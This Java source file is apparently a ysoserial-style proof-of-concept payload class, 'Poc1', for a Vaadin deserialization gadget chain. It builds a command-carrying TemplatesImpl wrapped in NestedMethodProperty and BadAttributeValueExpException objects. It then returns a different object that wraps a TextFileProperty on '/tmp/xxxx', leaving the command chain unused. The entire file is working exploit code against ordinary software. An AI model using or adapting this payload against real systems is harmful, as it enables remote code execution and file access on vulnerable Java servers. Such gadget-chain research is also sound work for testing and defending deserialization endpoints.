package ysoserial.payloads.tabbyGadgetChains.Vaadin1;



import javax.management.BadAttributeValueExpException;

import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import com.vaadin.data.util.TextFileProperty;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.*;
public class Poc1 implements ObjectPayload<Object>
{
    @Override
    public Object getObject (String command) throws Exception
    {
        Object templ = Gadgets.createTemplatesImpl (command);
        PropertysetItem pItem = new PropertysetItem ();

        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templ, "outputProperties");
        pItem.addItemProperty ("outputProperties", nmprop);

        BadAttributeValueExpException b = new BadAttributeValueExpException ("");
        Reflections.setFieldValue (b, "val", pItem);

        TextFileProperty textFileProperty = new TextFileProperty(new File("/tmp/xxxx"));
        BadAttributeValueExpException xxxx = new BadAttributeValueExpException ("");
        Reflections.setFieldValue (xxxx, "val", textFileProperty);


        return xxxx;




    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Poc1.class, args);
    }

}
